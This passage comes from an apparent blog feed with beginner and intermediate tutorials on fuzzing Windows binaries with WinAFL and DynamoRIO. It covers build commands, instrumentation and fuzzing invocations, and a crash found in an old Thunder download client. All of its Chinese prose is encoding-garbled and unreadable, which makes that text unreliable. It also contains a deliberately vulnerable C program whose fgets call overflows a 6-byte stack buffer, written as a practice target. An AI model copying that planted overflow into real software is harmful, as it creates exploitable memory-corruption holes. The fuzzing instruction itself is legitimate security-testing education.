class="line">-coverage_module P2PBase.dll ^</span><br><span class="line">-coverage_module AssistantTools.dll ^</span><br><span class="line">-target_module fuzz_program.exe ^</span><br><span class="line">-target_offset 0x11ef ^</span><br><span class="line">-fuzz_iterations 10 -nargs 2 ^</span><br><span class="line">-- fuzz_program.exe &quot;D:\HackTools\Fuzz\WinAFLFuzz\testcase\thunder_fuzzer\testin\ubuntu-18.04.5-desktop-amd64.iso.torrent&quot;</span><br></pre></td></tr></table></figure><ul><li><p><strong>é—®é¢˜1ï¼š</strong></p><p>å¦‚æœä½ ä½¿ç”¨çš„<code>Dynamorio</code>æ˜¯å¤§äº <strong>8.0.0-1</strong>ç‰ˆæœ¬çš„ï¼Œå¾ˆå¤§æ¦‚ç‡ä¼šå‡ºç°é”™è¯¯ç±»ä¼¼äºä¸‹é¢</p><img src="https://img.joe1sn.top/uploads/big/8be39e57103291b9933c16e1a6e5938e.png" alt="image-20230721111548243" style="zoom: 50%;" /><p>è¿™ç§æƒ…å†µå°±æ˜¯ç”Ÿæˆè¦†ç›–ç‡æ–‡ä»¶æ˜¯å¯¹çš„ï¼Œä½†æ˜¯æµ‹è¯•çš„æ—¶å€™å½“ç¨‹åºè¿›è¡ŒIATå¯¼å…¥çš„æ—¶å€™ï¼Œåœ¨<code>dynamorio</code>ä¸­çš„harnesså´©æºƒäº†ï¼Œæ‰€ä»¥ç¨‹åºè¿˜æ²¡æœ‰è¿›å…¥<code>entry</code>å…¥å£ç‚¹å‡½æ•°å°±ç›´æ¥å¯„äº†ã€‚è¿™ä¸ªé”™è¯¯å¾ˆæœ‰æ„æ€ï¼ŒåŠ è½½ç±»ä¼¼<code>ntdll.dll</code>æˆ–è€…è‡ªå·±åœ¨windowsä¸Šå†™çš„DLLï¼ˆå“ªæ€•æ— ç¬¦å·ï¼‰éƒ½å¯ä»¥ï¼Œå½“harnessä¸­çš„<code>LoadLibrary</code>è½½å…¥å…¶ä»–DLLçš„æ—¶å€™ï¼ˆæ¯”å¦‚æŸä¸ªè½¯ä»¶çš„<code>ffmpeg.dll</code>ï¼‰ä¹Ÿä¼šæŠ¥é”™ã€‚<br />è¿™ä¸ªé—®é¢˜æˆ‘è§£å†³äº†ä¸€å¤©ä¹Ÿæ²¡æœ‰è§£å†³ï¼Œåˆ°æ˜¯åœ¨çœ‹é›ªæ‰¾äº†ä¸€ä¸ªå’Œæˆ‘ä¸€æ ·çš„å¸–å­</p><p><a href="https://bbs.kanxue.com/thread-274169.htm">https://bbs.kanxue.com/thread-274169.htm</a></p><p><strong>æœ€åæˆ‘çš„è§£å†³æ–¹æ³•æ˜¯æ›´æ¢åˆ°dynamorio 8.0.0-1ç‰ˆæœ¬è¿‡åé‡æ–°ç¼–è¯‘å°±è¡Œäº†</strong></p></li><li><p><strong>é—®é¢˜2ï¼š</strong></p><p>å½“ä½ ä½¿ç”¨<code>target_method</code>çš„æ—¶å€™ï¼Œç¨‹åºæ‰¾ä¸åˆ°è¯¥æ–¹æ³•ï¼Œè¿™åœ¨ä½ è¿›è¡Œæµ‹è¯•winaflæ¡ˆä¾‹çš„æ—¶å€™å¾ˆå¸¸è§ï¼ŒåŸå› æ˜¯è¯¥æ–¹æ³•æ²¡æœ‰è¿›è¡Œå¯¼å‡ºï¼Œåœ¨å‡½æ•°å‰é¢åŠ ä¸Š<code>extern &quot;C&quot; __declspec(dllexport)</code>å°±è¡Œäº†</p><img src="https://img.joe1sn.top/uploads/big/9445f402596260b4ace1ac70c24f489b.png" alt="image-20230721112432715" style="zoom:50%;" /></li></ul><p>é¦–å…ˆå°±æ˜¯ç¼©å‡testcase</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python &quot;D:\HackTools\Fuzz\__FuzzWork\winafl\winafl-cmin.py&quot; --working-dir &quot;D:\HackTools\Fuzz\__FuzzWork\winafl\build_Win32\bin\Release&quot; -D &quot;D:\HackTools\Fuzz\__FuzzWork\dynamorio\build_Win32\bin32&quot; -t 9000 -i &quot;D:\HackTools\Fuzz\WinAFLFuzz\testcase\thunder_fuzzer\testin&quot; -o &quot;D:\HackTools\Fuzz\WinAFLFuzz\testcase\thunder_fuzzer\in&quot; -coverage_module AssistantTools.dll -coverage_module P2PBase.dll -target_module fuzz_program.exe -target_method fuzz_method -nargs 1 -- fuzz_program.exe @@ </span><br></pre></td></tr></table></figure><p>ç„¶åå¼€å§‹fuzzï¼Œå¼€å¯ä¸€ä¸ªMasterå§</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">afl-fuzz.exe ^</span><br><span class="line">-M master ^</span><br><span class="line">-i &quot;D:\HackTools\Fuzz\WinAFLFuzz\testcase\thunder_fuzzer\in&quot; ^</span><br><span class="line">-o &quot;D:\HackTools\Fuzz\WinAFLFuzz\testcase\thunder_fuzzer\out&quot; ^</span><br><span class="line">-D &quot;D:\HackTools\Fuzz\__FuzzWork\dynamorio\build_Win32\bin32&quot; ^</span><br><span class="line">-I 100000+ -t 9000 -- ^</span><br><span class="line">-coverage_module AssistantTools.dll ^</span><br><span class="line">-coverage_module P2PBase.dll ^</span><br><span class="line">-target_module fuzz_program.exe ^</span><br><span class="line">-target_method fuzz_method ^</span><br><span class="line">-fuzz_iterations 5000 -nargs 1 -- ^</span><br><span class="line">fuzz_program.exe @@</span><br></pre></td></tr></table></figure><ul><li><p><code>-M</code>: æŒ‡å®šè¿™æ˜¯ä¸€ä¸ªMasterè¿›ç¨‹</p></li><li><p><code>-i -</code>ï¼šå½“fuzzæš‚åœçš„æ—¶å€™æ¢å¤ï¼Œåœ¨AFLä¸Šæ˜¯<code>-in -</code>ï¼Œå…·ä½“ç”¨æ³•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">afl-fuzz.exe ^</span><br><span class="line">-M master ^</span><br><span class="line">-i -&quot;D:\HackTools\Fuzz\WinAFLFuzz\testcase\thunder_fuzzer\in&quot; ^</span><br><span class="line">-o &quot;D:\HackTools\Fuzz\WinAFLFuzz\testcase\thunder_fuzzer\out&quot; ^</span><br><span class="line">....</span><br></pre></td></tr></table></figure></li></ul><p><img src="https://img.joe1sn.top/uploads/big/f8eda3779cf4f5a853f8a2e4370b3dfb.png" alt="img" /></p><p>è‡ªå·±æ”¹å†™çš„harnessç¡®å®å¿«ï¼Œä½†ä¹Ÿä¸è‡³äºä¸€ä¸‹å­å°±è·‘å‡ºæ¥ï¼Œè¿™é‡Œæˆ‘ç”¨æ—§ç‰ˆæœ¬çš„è¿…é›·è¯•äº†ä¸‹</p><img src="https://img.joe1sn.top/uploads/big/964c55b0c61c8d59db09b4b65d3deabb.png" alt="img" style="zoom:67%;" /><p>ä¹Ÿå°±æ˜¯ä¸€ä¸ªè¢«ä¿®å¤çš„Ã·0æŠ¥é”™ï¼ˆEXCEPTION_INT_DIVIDE_BY_ZEROï¼‰</p><p>æ˜¨å¤©16hé«˜å¼ºåº¦ä¿®å¤é—®é¢˜1ï¼Œæš‚æ—¶æ›´æ–°åˆ°è¿™é‡Œ</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;ä¸ºä»€ä¹ˆä¸å«é«˜çº§ç¯‡ï¼Œå› ä¸ºé«˜çº§çš„æˆ‘ä¹Ÿä¸ä¼š&lt;/p&gt;
&lt;p&gt;ä¸»è¦è®²ä¸€ä¸‹æ›´è´´è¿‘å®é™…çš„ç”¨æ³•å§&lt;/p&gt;
&lt;p&gt;!!!ä»…å¤§æ ‡é¢˜1å®Œæˆï¼Œå…¨ç‰‡æœªå®Œå¾…ç»­!!!&lt;/p&gt;</summary>
    
    
    
    <category term="CVE" scheme="https://joe1sn.eu.org/categories/CVE/"/>
    
    
    <category term="CVE" scheme="https://joe1sn.eu.org/tags/CVE/"/>
    
    <category term="fuzz" scheme="https://joe1sn.eu.org/tags/fuzz/"/>
    
  </entry>
  
  <entry>
    <title>ã€æ¼æ´æŒ–æ˜ã€‘win-aflä½¿ç”¨æŒ‡åŒ—-åˆçº§ç¯‡</title>
    <link href="https://joe1sn.eu.org/2023/07/18/win-afl/"/>
    <id>https://joe1sn.eu.org/2023/07/18/win-afl/</id>
    <published>2023-07-18T07:27:44.000Z</published>
    <updated>2023-07-19T14:08:42.244Z</updated>
    
    <content type="html"><![CDATA[<p>åœ¨21å¹´çš„æ—¶å€™æ›¾ç»å°å°çš„ä½¿ç”¨äº†ä¸€ç‚¹WinAFLï¼Œç°åœ¨å†å›è¿‡å¤´æ¥åšç¬”è®°</p><p>è¿™é‡Œä¸»è¦è®²è¿°WinAFL+DynamoRIOçš„Fuzzæ–¹æ³•</p><span id="more"></span><h1 id="ç®€ä»‹"><a class="markdownIt-Anchor" href="#ç®€ä»‹"></a> ç®€ä»‹</h1><p>çŸ¥é“åˆ›å®‡è¿™ç¯‡æ–‡ç« è®²çš„å·²ç»å¾ˆå¥½äº†ï¼š<a href="https://paper.seebug.org/323/">https://paper.seebug.org/323/</a></p><p>ç”±äºé—­æºç‰¹ç‚¹ï¼Œé‚£ä¹ˆéœ€è¦ä½¿ç”¨DynamoRIOè¿›è¡Œæ’æ¡©ï¼Œæ£€æµ‹æŒ‡ä»¤å—çš„è½¬ç§»</p><p>WinAFLä¸»è¦ç‰¹ç‚¹å°±æ˜¯å°†AFLä¸­çš„å‡½æ•°ä½¿ç”¨WinAPIè¿›è¡Œé‡å†™ï¼Œç„¶åè°ƒç”¨DynamoRIOçš„APIå®Œæˆfuzz</p><h1 id="ç¼–è¯‘"><a class="markdownIt-Anchor" href="#ç¼–è¯‘"></a> ç¼–è¯‘</h1><p>ä¸»è¦æ˜¯å‚è€ƒäº†<a href="https://bbs.kanxue.com/thread-261323.htm%E5%92%8C%E5%AE%98%E6%96%B9%E8%BF%87%E7%A8%8B%EF%BC%9Ahttps://dynamorio.org/page_building.html">https://bbs.kanxue.com/thread-261323.htmå’Œå®˜æ–¹è¿‡ç¨‹ï¼šhttps://dynamorio.org/page_building.html</a></p><h2 id="dynamorio"><a class="markdownIt-Anchor" href="#dynamorio"></a> DynamoRIO</h2><h3 id="32ä½"><a class="markdownIt-Anchor" href="#32ä½"></a> 32ä½</h3><h4 id="1-ç¼–è¯‘"><a class="markdownIt-Anchor" href="#1-ç¼–è¯‘"></a> 1. ç¼–è¯‘</h4><p>è½¯ä»¶ä¸‹è½½ä¸€æŠŠæ¢­</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/DynamoRIO/dynamorio.git</span><br><span class="line">cd dynamorio</span><br><span class="line">mkdir build_Win32</span><br><span class="line">mkdir build_x64</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä½¿ç”¨çš„æ˜¯<code>x86 Native Tools Command Prompt</code>å‘½ä»¤è¡Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmake -G&quot;Visual Studio 16&quot; -A Win32 ..</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/77bda948b6a701db350fb235797056e0.png" alt="image-20230719000330825" /></p><p>å¦‚æœå‘ç°ç¼ºå°‘ä»€ä¹ˆçš„è¯ï¼Œä½¿ç”¨<code>set Name=Value</code>å†ç¼–è¯‘ï¼Œæœ€å</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmake --build . --config RelWithDebInfo</span><br></pre></td></tr></table></figure><h4 id="2-æµ‹è¯•"><a class="markdownIt-Anchor" href="#2-æµ‹è¯•"></a> 2. æµ‹è¯•</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;D:\HackTools\Fuzz\__FuzzWork\dynamorio\build_win32\bin32\drrun.exe&quot; -t drcov -- &quot;D:\HackTools\Fuzz\WinAFLFuzz\testcase\32\HelloWorld.exe&quot; &quot;D:\HackTools\Fuzz\WinAFLFuzz\testcase\32\password.txt&quot;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘æ¢æˆäº†è€ç‰ˆæœ¬ dynamorio-cronbuild-8.0.18684ï¼Œå› ä¸ºæ–°ç‰ˆæœ¬æ˜¯3.0ç‰ˆæœ¬çš„è¦†ç›–ç‡æ–‡ä»¶ï¼ŒIDA Lighthouseåªæ”¯æŒ2.0ï¼Œä¸è¿‡ä½ å¯ä»¥é€šè¿‡<a href="https://gist.github.com/wumb0/de671cc5051353fd32af4aecc811a282%E8%BF%9B%E8%A1%8C%E7%89%88%E6%9C%AC%E7%9A%84%E8%BD%AC%E6%8D%A2%E3%80%82">https://gist.github.com/wumb0/de671cc5051353fd32af4aecc811a282è¿›è¡Œç‰ˆæœ¬çš„è½¬æ¢ã€‚</a></p><p><img src="https://img.joe1sn.top/uploads/big/47ade84053329cd3875e97c5d3c19562.png" alt="image-20230719081301132" /></p><h3 id="64ä½"><a class="markdownIt-Anchor" href="#64ä½"></a> 64ä½</h3><h4 id="1-ç¼–è¯‘-2"><a class="markdownIt-Anchor" href="#1-ç¼–è¯‘-2"></a> 1. ç¼–è¯‘</h4><p>æŒ‰ç…§å®˜æ–¹çš„æ­¥éª¤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%comspec% /k &quot;C:\Program Files (x86)\Microsoft Visual Studio\2019\Enterprise\VC\Auxiliary\Build\vcvarsamd64_x86.bat&quot;</span><br></pre></td></tr></table></figure><p>æˆ–è€…å¯åŠ¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Developer Command Prompt for VS 2019</span><br></pre></td></tr></table></figure><p>ç„¶åè¿›è¡Œcmakeé…ç½®</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmake -A x64 ..</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/0e10d36abf96b93682871ec08ace8fa9.png" alt="image-20230719081540005" /></p><p>å°±å¯ä»¥å‚è€ƒçœ‹é›ªé‚£ç¯‡æ–‡ç« ä¿®æ”¹ä¸‹æŠ¥é”™</p><p>åˆ©ç”¨cmake-guiä¿®æ”¹å®Œè¿‡åå°±å¯ä»¥ç»§ç»­å›åˆ°cmdè¿›è¡Œç¼–è¯‘äº†ï¼ˆä¹Ÿå¯ä»¥ç”¨vs2019ï¼‰</p><p><img src="https://img.joe1sn.top/uploads/big/f3984b961053db86e86b2e2056e66173.png" alt="image-20230719081913889" /></p><h4 id="2-æµ‹è¯•-2"><a class="markdownIt-Anchor" href="#2-æµ‹è¯•-2"></a> 2. æµ‹è¯•</h4><p><img src="https://img.joe1sn.top/uploads/big/e212aa65d03465a205a2b64ff66ea06d.png" alt="image-20230719082924046" /></p><h2 id="winafl"><a class="markdownIt-Anchor" href="#winafl"></a> WinAFL</h2><p>èµ·æ‰‹å¼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/googleprojectzero/winafl.git</span><br><span class="line">cd winafl</span><br><span class="line">git submodule update --init --recursive</span><br><span class="line">mkdir build_Win32</span><br><span class="line">mkdir build_x64</span><br></pre></td></tr></table></figure><ol><li><p>ç¼–è¯‘32ä½</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cmake -G&quot;Visual Studio 16 2019&quot; .. -A Win32 -DDynamoRIO_DIR=D:\HackTools\Fuzz\__FuzzWork\dynamorio\build_Win32\cmake -DINTELPT=1 -DUSE_COLOR=1</span><br><span class="line">cmake --build . --config Release</span><br></pre></td></tr></table></figure><p>å¦‚æœæ˜¾ç¤º<code>drgui</code>ä¸å®Œæ•´ï¼Œè¿”å›å»åœ¨ç”Ÿæˆå°±è¡Œäº†ï¼Œçœ‹é›ªä¸Šçš„æ•™ç¨‹æ˜¯æ²¡æœ‰é—®é¢˜çš„</p></li><li><p>ç¼–è¯‘64ä½</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cmake -G&quot;Visual Studio 16 2019&quot; -A x64 .. -DDynamoRIO_DIR=&quot;D:\HackTools\Fuzz\__FuzzWork\dynamorio\build_x64\cmake&quot; -DINTELPT=1 -DUSE_COLOR=1</span><br><span class="line">cmake --build . --config Release</span><br></pre></td></tr></table></figure></li></ol><h1 id="æµ‹è¯•"><a class="markdownIt-Anchor" href="#æµ‹è¯•"></a> æµ‹è¯•</h1><h2 id="32ä½-2"><a class="markdownIt-Anchor" href="#32ä½-2"></a> 32ä½</h2><ol><li><p>é¦–å…ˆè¿›è¡Œæ’æ¡©</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line">:: æ¥å—ç”¨æˆ·è¾“å…¥</span><br><span class="line"><span class="built_in">set</span> /p target_module=traget excutable : </span><br><span class="line"><span class="built_in">set</span> /p target_offset=traget offset : </span><br><span class="line"><span class="built_in">set</span> /p sample=pins sample: </span><br><span class="line"></span><br><span class="line">:: è¾“å‡ºç”¨æˆ·è¾“å…¥çš„å†…å®¹</span><br><span class="line"><span class="built_in">echo</span> target_module, <span class="variable">%target_module%</span>!</span><br><span class="line"><span class="built_in">echo</span> target_offset, <span class="variable">%target_offset%</span>!</span><br><span class="line"><span class="built_in">echo</span> sample, <span class="variable">%sample%</span>!</span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">D:\<span class="title">HackTools</span>\<span class="title">Fuzz</span>\<span class="title">__FuzzWork</span>\<span class="title">dynamorio</span>\<span class="title">build_Win32</span>\<span class="title">bin32</span>\<span class="title">drrun.exe</span> ^</span></span><br><span class="line"><span class="function">-<span class="title">c</span> <span class="title">D</span>:\<span class="title">HackTools</span>\<span class="title">Fuzz</span>\<span class="title">__FuzzWork</span>\<span class="title">winafl</span>\<span class="title">build_Win32</span>\<span class="title">bin</span>\<span class="title">Release</span>\<span class="title">winafl.dll</span> -<span class="title">debug</span> ^</span></span><br><span class="line"><span class="function">-<span class="title">target_module</span> %<span class="title">target_module</span>% ^</span></span><br><span class="line"><span class="function">-<span class="title">target_offset</span> %<span class="title">target_offset</span>% ^</span></span><br><span class="line"><span class="function">-<span class="title">fuzz_iterations</span> 10 -<span class="title">nargs</span> 2 -- ^</span></span><br><span class="line"><span class="function">%<span class="title">target_module</span>% %<span class="title">sample</span>%</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">D:\HackTools\Fuzz\__FuzzWork\dynamorio\build_Win32\bin32\drrun.exe ^</span><br><span class="line">-c D:\HackTools\Fuzz\__FuzzWork\winafl\build_Win32\bin\Release\winafl.dll -debug ^</span><br><span class="line">-target_module test.exe ^</span><br><span class="line">-target_offset 0x1210 ^</span><br><span class="line">-fuzz_iterations 10 -nargs 2 -- ^</span><br><span class="line">test.exe .\in\password.txt</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹ç”Ÿæˆçš„logæ–‡ä»¶ï¼Œå¦‚æœæœ‰<code>Everything appears to be running normally.</code>é‚£ä¹ˆå°±æ˜¯å®Œæˆäº†</p></li><li><p>å¼€å§‹fuzz</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">afl-fuzz.exe ^</span><br><span class="line">-i .\in ^</span><br><span class="line">-o &quot;D:\HackTools\Fuzz\WinAFLFuzz\out&quot; ^</span><br><span class="line">-D &quot;D:\HackTools\Fuzz\__FuzzWork\dynamorio\build_Win32\bin32&quot; ^</span><br><span class="line">-I 100000+ -t 90000+ -- ^</span><br><span class="line">-coverage_module test.exe ^</span><br><span class="line">-target_module test.exe ^</span><br><span class="line">-target_offset 0x1210 ^</span><br><span class="line">-fuzz_iterations 5000 -nargs 1 -- ^</span><br><span class="line">test.exe @@</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/ea80329361bc5efe5305e79b94370480.png" alt="image-20230719131211815" /></p></li></ol><h2 id="64ä½-2"><a class="markdownIt-Anchor" href="#64ä½-2"></a> 64ä½</h2><p>è¿‡ç¨‹ä¹Ÿå·®ä¸å¤š</p><p>å…ˆæ’æ¡©</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">traget excutable : test.exe</span><br><span class="line">traget offset : 0x1200</span><br><span class="line">pins sample: .\in\input.bmp</span><br><span class="line">target_module, test.exe!</span><br><span class="line">target_offset, 0x1200!  </span><br><span class="line">sample, .\in\input.bmp!</span><br></pre></td></tr></table></figure><p>ç„¶åfuzz</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">afl-fuzz.exe ^</span><br><span class="line">-i .\in ^</span><br><span class="line">-o .\out ^</span><br><span class="line">-D &quot;D:\HackTools\Fuzz\__FuzzWork\dynamorio\build_x64\bin64&quot; ^</span><br><span class="line">-I 100000+ -t 90000+ -- ^</span><br><span class="line">-coverage_module test.exe ^</span><br><span class="line">-target_module test.exe ^</span><br><span class="line">-target_offset 0x1210 ^</span><br><span class="line">-fuzz_iterations 5000 -nargs 1 -- ^</span><br><span class="line">test.exe @@</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/916e80cff30a0ee3d94ceca18eb32ad4.png" alt="image-20230719134046975" /></p><h1 id="æµ‹è¯•2-simplehunt"><a class="markdownIt-Anchor" href="#æµ‹è¯•2-simplehunt"></a> æµ‹è¯•2 - SimpleHunt</h1><p>åœ¨ä¹‹å‰æˆ‘çš„åšå®¢å†™äº†windowsä¸‹æ ˆæº¢å‡ºçš„è¿‡ç¨‹ï¼Œè¿™é‡Œæˆ‘æ”¹å†™äº†ä¸‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">hacked</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Hacked\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vuln</span><span class="params">(<span class="type">char</span> *FileDir)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> password[<span class="number">6</span>] = <span class="string">&quot;ABCDE&quot;</span>;</span><br><span class="line"><span class="type">char</span> str[<span class="number">6</span>];</span><br><span class="line">FILE *fp;</span><br><span class="line"><span class="keyword">if</span>(!(fp=fopen(FileDir,<span class="string">&quot;r&quot;</span>)))&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Open Failed\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">fgets(str, <span class="number">0x1000</span>, fp);</span><br><span class="line"></span><br><span class="line">str[<span class="number">5</span>]=<span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strcmp</span>(str,password)==<span class="number">0</span>)</span><br><span class="line"><span class="comment">// fprintf(stderr,&quot;OK.\n&quot;);</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;OK.\n&quot;</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="comment">// fprintf(stderr,&quot;NO.\n&quot;);</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;NO.\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (argc != <span class="number">2</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Usage: ./HelloWorld.exe FileName\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">vuln(argv[<span class="number">1</span>]);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc HelloWorld.c -o HelloWorld</span><br></pre></td></tr></table></figure><p>æ²¡æœ‰ä»»ä½•ä¿æŠ¤ï¼Œè¿™é‡Œä»¥32ä½ä¸¾ä¾‹</p><h2 id="fuzz"><a class="markdownIt-Anchor" href="#fuzz"></a> fuzz</h2><p>ç”±äºä»£ç æ¯”è¾ƒç®€å•ï¼Œä¸éœ€è¦å…ˆç”Ÿæˆè¦†ç›–ç‡æ–‡ä»¶æ‰¾åˆ°å…³é”®å‡½æ•°ï¼Œæ‰€ä»¥é¦–å…ˆè¿˜æ˜¯æ’æ¡©</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">D:\HackTools\Fuzz\__FuzzWork\dynamorio\build_Win32\bin32\drrun.exe ^</span><br><span class="line">-c D:\HackTools\Fuzz\__FuzzWork\winafl\build_Win32\bin\Release\winafl.dll -debug ^</span><br><span class="line">-target_module HelloWorld.exe ^</span><br><span class="line">-target_offset 0x16c4 ^</span><br><span class="line">-fuzz_iterations 10 -nargs 2 -- ^</span><br><span class="line">HelloWorld.exe in\password.txt</span><br></pre></td></tr></table></figure><p>å¼€å§‹fuzz</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">afl-fuzz.exe ^</span><br><span class="line">-i &quot;D:\HackTools\Fuzz\WinAFLFuzz\in&quot; ^</span><br><span class="line">-o &quot;D:\HackTools\Fuzz\WinAFLFuzz\out&quot; ^</span><br><span class="line">-D &quot;D:\HackTools\Fuzz\__FuzzWork\dynamorio\build_Win32\bin32&quot; ^</span><br><span class="line">-I 100000+ -t 90000+ -- ^</span><br><span class="line">-coverage_module HelloWorld.exe ^</span><br><span class="line">-target_module HelloWorld.exe ^</span><br><span class="line">-target_offset 0x16c4 ^</span><br><span class="line">-fuzz_iterations 5000 -nargs 2 -- ^</span><br><span class="line">HelloWorld.exe 